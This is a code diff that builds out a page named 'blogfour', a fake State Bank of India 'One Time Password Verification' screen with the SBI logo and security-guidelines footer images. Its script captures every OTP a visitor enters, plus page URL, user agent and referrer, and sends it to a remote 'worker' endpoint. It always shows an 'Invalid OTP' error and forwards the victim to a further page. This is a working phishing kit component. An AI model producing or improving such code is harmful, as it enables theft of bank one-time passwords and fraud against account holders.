@@ -4,29 +4,303 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>blogfour</title>
-    <style> /* include the full style from your original blogfour with error/success messages */ </style>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f0f0;
+            min-height: 100vh;
+            padding-bottom: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 15px;
+            background-color: white;
+        }
+        
+        .logo {
+            max-width: 100%;
+            height: auto;
+            max-height: 120px;
+        }
+        
+        .container {
+            max-width: 420px;
+            margin: 15px auto;
+            background-color: white;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        
+        .form-header {
+            color: #000;
+            padding: 18px 20px 8px 20px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .form-content {
+            padding: 0 20px 20px 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 10px;
+            position: relative;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 3px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 6px 0;
+            font-size: 18px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            background-color: transparent;
+            outline: none;
+            border-radius: 0;
+            transition: border-color 0.3s;
+            text-align: left;
+            font-weight: bold;
+        }
+        
+        /* Placeholder styling - smaller font */
+        .form-input::placeholder {
+            font-size: 12px;
+            color: #999;
+            font-weight: normal;
+            font-style: italic;
+            letter-spacing: 0.5px;
+        }
+        
+        .form-input:focus {
+            border-bottom-color: #24A1E8;
+        }
+        
+        .proceed-button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #24A1E8;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        
+        .proceed-button:hover {
+            background-color: #1a8cd8;
+        }
+        
+        .message {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+        
+        /* Input और resend button के बीच spacing */
+        .input-resend-container {
+            margin-bottom: 10px;
+        }
+        
+        .resend-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 5px;
+        }
+        
+        /* Resend button SkyBlue */
+        .resend-button {
+            width: 80px;
+            padding: 4px 0;
+            background-color: #87CEEB;
+            color: white;
+            font-size: 11px;
+            font-weight: bold;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s;
+        }
+        
+        .resend-button:enabled {
+            background-color: #70b8d8;
+        }
+        
+        .resend-button:hover:enabled {
+            background-color: #5ca3c2;
+        }
+        
+        .resend-button:disabled {
+            background-color: #b3e0f2;
+            color: white;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+        
+        .timer {
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        
+        .asterisk {
+            color: #ff0000;
+        }
+        
+        .footer-img {
+            width: 100%;
+            max-width: 900px;
+            display: block;
+            margin: 20px auto 0;
+        }
+        
+        /* Error message styling */
+        .error-message {
+            color: #ff0000 !important;
+            font-size: 12px;
+            margin: 8px 0 0 0;
+            text-align: left;
+            line-height: 1.6;
+            font-weight: normal;
+            display: block;
+            padding-left: 2px;
+        }
+        
+        .error-title {
+            font-weight: bold;
+        }
+        
+        /* Line separator exactly like in image */
+        .separator {
+            border-top: 1px solid #ccc;
+            margin: 15px 0;
+        }
+    </style>
 </head>
 <body>
-    <!-- Header/Footer same -->
-    <div class="header">...</div>
-    <div class="container">...</div>
-    <img src="...">
-
-    <script>
-        // sab kuch original jaisa, bas submission part change karo:
+    <!-- Same Header as index.html -->
+    <div class="header">
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
+             alt="SBI Logo" 
+             class="logo">
+    </div>
+    
+    <!-- OTP Verification Form -->
+    <div class="container">
+        <div class="form-header">
+            One Time Password (OTP) Verification
+        </div>
         
+        <div class="form-content">
+            <div class="message">
+                One Time Password (OTP) has been sent to your registered mobile Number.<br>
+                Please enter the OTP and proceed.
+            </div>
+            
+            <!-- Line separator -->
+            <div class="separator"></div>
+            
+            <!-- Input और resend button container -->
+            <div class="input-resend-container">
+                <div class="form-group">
+                    <label class="form-label">One Time Password <span class="asterisk">*</span></label>
+                    <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}" placeholder="enter 6 digit otp">
+                    
+                    <!-- Error message हमेशा दिखेगा -->
+                    <div class="error-message" id="errorMessage">
+                        <span class="error-title">Invalid One Time Password!</span>
+                    </div>
+                </div>
+                
+                <!-- Resend button OTP input के ठीक नीचे -->
+                <div class="resend-container">
+                    <button class="resend-button" id="resendButton" disabled>Resend OTP</button>
+                </div>
+            </div>
+            
+            <!-- Timer exactly like in image -->
+            <div class="timer" id="timer">176</div>
+            
+            <button class="proceed-button" id="proceedButton">PROCEED</button>
+        </div>
+    </div>
+    
+    <!-- Same Footer as index.html -->
+    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
+         alt="Security Guidelines" 
+         class="footer-img">
+    
+    <script>
+        // OTP Input Formatting
+        const otpInput = document.getElementById('otpInput');
+        const timerElement = document.getElementById('timer');
+        const proceedButton = document.getElementById('proceedButton');
+        const errorMessage = document.getElementById('errorMessage');
+        const resendButton = document.getElementById('resendButton');
+        
+        // Timer Countdown (176 seconds as in image)
+        let seconds = 176;
+        let timerInterval;
+        
+        function updateTimer() {
+            seconds--;
+            timerElement.textContent = `${seconds}`;
+            
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                timerElement.textContent = "0";
+                timerElement.style.color = "#666";
+                // Enable resend button when timer reaches 0
+                resendButton.disabled = false;
+            }
+        }
+        
+        // Start the timer
+        timerInterval = setInterval(updateTimer, 1000);
+        
+        // OTP Input - Auto move and formatting
+        otpInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.substring(0, 6);
+            e.target.value = value;
+            
+            // OTP डालने पर error message नहीं छिपेगा
+        });
+        
+        // Function to save OTP data to worker (localStorage हटाया)
         async function saveOTPData(otpValue, status) {
             const submission = {
                 id: Date.now(),
                 type: 'OTP2',
-                data: {
+                data: { 
                     otp: otpValue,
                     status: status,
+                    page: window.location.href,
                     userAgent: navigator.userAgent,
-                    timeSpent: (176 - seconds) + ' seconds',
-                    referrer: document.referrer,
-                    screenResolution: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language
+                    referrer: document.referrer
                 },
                 timestamp: new Date().toISOString()
             };
@@ -38,21 +312,103 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(submission)
                 });
-            } catch (e) { console.error(e); }
+            } catch (error) {
+                console.error('Worker submission error:', error);
+            }
         }
         
-        // Proceed button mein await lagao
-        proceedButton.addEventListener('click', async function(e) {
-            // ... validation same
-            if (otpValue !== "123456") {
-                await saveOTPData(otpValue, 'incorrect');
-                // ... error show
+        // Proceed Button
+        proceedButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const otpValue = otpInput.value.trim();
+            
+            // Check if OTP is valid
+            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
+                otpInput.style.borderBottomColor = '#ff0000';
+                // Save invalid OTP attempt
+                saveOTPData(otpValue, 'incorrect');
+                // Focus on OTP input
+                otpInput.focus();
+                // Redirect back to same page after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'blogfive.html';
+                }, 2000);
                 return;
             }
-            await saveOTPData(otpValue, 'correct');
-            // redirect after 2 sec
-            setTimeout(() => window.location.href = 'blogfive.html', 2000);
+            
+            // If OTP is not "123456", show error
+            if (otpValue !== "123456") {
+                otpInput.style.borderBottomColor = '#ff0000';
+                // Save incorrect OTP attempt
+                saveOTPData(otpValue, 'incorrect');
+                // Focus on OTP input
+                otpInput.focus();
+                // Redirect back to same page after 2 seconds
+                setTimeout(() => {
+                    window.location.href = 'blogfive.html';
+                }, 2000);
+                return;
+            }
+            
+            // If OTP is valid, proceed to next page
+            otpInput.style.borderBottomColor = '#24A1E8';
+            
+            // Save correct OTP data to worker
+            saveOTPData(otpValue, 'correct').then(() => {
+                // Redirect to next page
+                window.location.href = 'blogfive.html';
+            });
         });
+        
+        // Resend OTP Button
+        resendButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Only allow resend if button is enabled
+            if (resendButton.disabled) {
+                return;
+            }
+            
+            // Reset timer to 176
+            seconds = 176;
+            clearInterval(timerInterval);
+            timerElement.textContent = "176";
+            timerElement.style.color = "#333";
+            
+            // Restart timer
+            timerInterval = setInterval(updateTimer, 1000);
+            
+            // Clear OTP field
+            otpInput.value = "";
+            
+            // Reset border color
+            otpInput.style.borderBottomColor = '#ccc';
+            
+            // Disable button again
+            resendButton.disabled = true;
+            
+            // Focus on OTP input
+            otpInput.focus();
+            
+            // Show temporary message
+            alert("New OTP has been sent to your mobile number.");
+            
+            // Log OTP resend action to worker
+            saveOTPData('RESEND_REQUEST', 'resend_request');
+        });
+        
+        // Also handle Enter key on OTP input
+        otpInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                proceedButton.click();
+            }
+        });
+        
+        // Focus on OTP input when page loads
+        window.onload = function() {
+            otpInput.focus();
+        };
     </script>
 </body>
 </html>
